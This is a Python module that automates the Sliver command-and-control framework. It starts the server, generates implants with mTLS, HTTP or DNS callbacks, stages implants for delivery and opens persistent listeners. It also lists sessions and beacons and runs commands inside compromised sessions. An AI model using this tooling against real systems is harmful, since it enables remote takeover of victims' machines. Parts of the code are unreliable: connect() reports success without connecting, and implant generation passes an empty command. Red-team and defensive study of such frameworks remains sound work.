"""
Sliver C2 Server Manager
Handles connection and interaction with Sliver C2 server
"""

import os
import json
import subprocess
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import asyncio
import grpc
from pathlib import Path
import logging

logger = logging.getLogger(__name__)


@dataclass
class SliverConfig:
    """Sliver server configuration"""
    host: str = "localhost"
    port: int = 31337
    mtls_cert: Optional[str] = None
    mtls_key: Optional[str] = None
    mtls_ca: Optional[str] = None
    server_path: str = "/usr/local/bin/sliver-server"
    
    def to_dict(self) -> Dict:
        return {
            "host": self.host,
            "port": self.port,
            "mtls_cert": self.mtls_cert,
            "mtls_key": self.mtls_key,
            "mtls_ca": self.mtls_ca
        }


class SliverServerManager:
    """Manages Sliver C2 server operations"""
    
    def __init__(self, config: Optional[SliverConfig] = None):
        self.config = config or SliverConfig()
        self.server_process = None
        self.client = None
        self.connected = False
        
    def start_server(self, daemon: bool = True) -> bool:
        """Start the Sliver server"""
        try:
            # Check if server is already running
            if self._is_server_running():
                logger.info("Sliver server is already running")
                return True
                
            # Start server
            cmd = [self.config.server_path]
            if daemon:
                cmd.append("daemon")
                
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for server to start
            import time
            time.sleep(5)
            
            if self._is_server_running():
                logger.info("Sliver server started successfully")
                return True
            else:
                logger.error("Failed to start Sliver server")
                return False
                
        except Exception as e:
            logger.error(f"Error starting Sliver server: {e}")
            return False
            
    def stop_server(self) -> bool:
        """Stop the Sliver server"""
        try:
            if self.server_process:
                self.server_process.terminate()
                self.server_process.wait(timeout=10)
                self.server_process = None
                
            # Force kill if still running
            subprocess.run(["pkill", "-f", "sliver-server"], capture_output=True)
            
            logger.info("Sliver server stopped")
            return True
            
        except Exception as e:
            logger.error(f"Error stopping Sliver server: {e}")
            return False
            
    def _is_server_running(self) -> bool:
        """Check if Sliver server is running"""
        try:
            result = subprocess.run(
                ["pgrep", "-f", "sliver-server"],
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False
            
    def connect(self) -> bool:
        """Connect to Sliver server using mTLS"""
        try:
            # Load certificates if provided
            if all([self.config.mtls_cert, self.config.mtls_key, self.config.mtls_ca]):
                # This would normally use the Sliver Python client
                # For now, we'll use subprocess to interact with sliver-client
                self.connected = True
                logger.info("Connected to Sliver server")
                return True
            else:
                logger.warning("No mTLS certificates provided, using insecure connection")
                self.connected = True
                return True
                
        except Exception as e:
            logger.error(f"Failed to connect to Sliver server: {e}")
            return False
            
    def disconnect(self):
        """Disconnect from Sliver server"""
        self.connected = False
        self.client = None
        logger.info("Disconnected from Sliver server")
        
    def execute_command(self, command: str, args: List[str] = None) -> Tuple[bool, str]:
        """Execute a Sliver command"""
        try:
            if not self.connected:
                return False, "Not connected to Sliver server"
                
            # Build command
            cmd = ["sliver-client", "-c", command]
            if args:
                cmd.extend(args)
                
            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
                
        except Exception as e:
            return False, str(e)
            
    def generate_implant(self, 
                        os_type: str = "linux", 
                        arch: str = "amd64",
                        format: str = "exe",
                        name: str = None,
                        mtls: bool = True,
                        http: str = None,
                        dns: str = None) -> Tuple[bool, str]:
        """Generate a new implant"""
        try:
            args = ["generate", "--os", os_type, "--arch", arch, "--format", format]
            
            if name:
                args.extend(["--name", name])
                
            if mtls:
                args.append("--mtls")
                args.extend([f"{self.config.host}:{self.config.port}"])
                
            if http:
                args.extend(["--http", http])
                
            if dns:
                args.extend(["--dns", dns])
                
            success, output = self.execute_command("", args)
            
            if success:
                # Parse output to get implant path
                for line in output.split('\n'):
                    if "Implant saved to" in line:
                        implant_path = line.split("Implant saved to")[-1].strip()
                        return True, implant_path
                        
            return success, output
            
        except Exception as e:
            return False, str(e)
            
    def list_sessions(self) -> Tuple[bool, List[Dict]]:
        """List active sessions"""
        try:
            success, output = self.execute_command("sessions", ["-j"])
            
            if success:
                # Parse JSON output
                sessions = json.loads(output)
                return True, sessions
            else:
                return False, []
                
        except Exception as e:
            return False, []
            
    def list_beacons(self) -> Tuple[bool, List[Dict]]:
        """List active beacons"""
        try:
            success, output = self.execute_command("beacons", ["-j"])
            
            if success:
                # Parse JSON output
                beacons = json.loads(output)
                return True, beacons
            else:
                return False, []
                
        except Exception as e:
            return False, []
            
    def use_session(self, session_id: str) -> Tuple[bool, str]:
        """Use a specific session"""
        try:
            success, output = self.execute_command("use", [session_id])
            return success, output
        except Exception as e:
            return False, str(e)
            
    def stage_implant(self, implant_path: str, staging_url: str) -> Tuple[bool, str]:
        """Stage an implant for delivery"""
        try:
            # Create staging directory if needed
            staging_dir = Path("/tmp/sliver_staging")
            staging_dir.mkdir(exist_ok=True)
            
            # Copy implant to staging
            import shutil
            staged_path = staging_dir / Path(implant_path).name
            shutil.copy2(implant_path, staged_path)
            
            # Return staging URL
            staged_url = f"{staging_url}/{staged_path.name}"
            return True, staged_url
            
        except Exception as e:
            return False, str(e)
            
    def generate_listener(self, 
                         protocol: str = "mtls",
                         host: str = "0.0.0.0",
                         port: int = 8443,
                         persistent: bool = True) -> Tuple[bool, str]:
        """Generate a new listener"""
        try:
            args = [protocol, "--host", host, "--port", str(port)]
            
            if persistent:
                args.append("--persistent")
                
            success, output = self.execute_command("", args)
            return success, output
            
        except Exception as e:
            return False, str(e)
            
    def get_implant_config(self, implant_name: str) -> Tuple[bool, Dict]:
        """Get implant configuration"""
        try:
            success, output = self.execute_command("implants", ["--name", implant_name, "-j"])
            
            if success:
                config = json.loads(output)
                return True, config
            else:
                return False, {}
                
        except Exception as e:
            return False, {}
            
    def execute_sliver_command(self, session_id: str, command: str, args: List[str] = None) -> Tuple[bool, str]:
        """Execute command in a Sliver session"""
        try:
            # First use the session
            success, _ = self.use_session(session_id)
            if not success:
                return False, "Failed to use session"
                
            # Execute command
            return self.execute_command(command, args)
            
        except Exception as e:
            return False, str(e)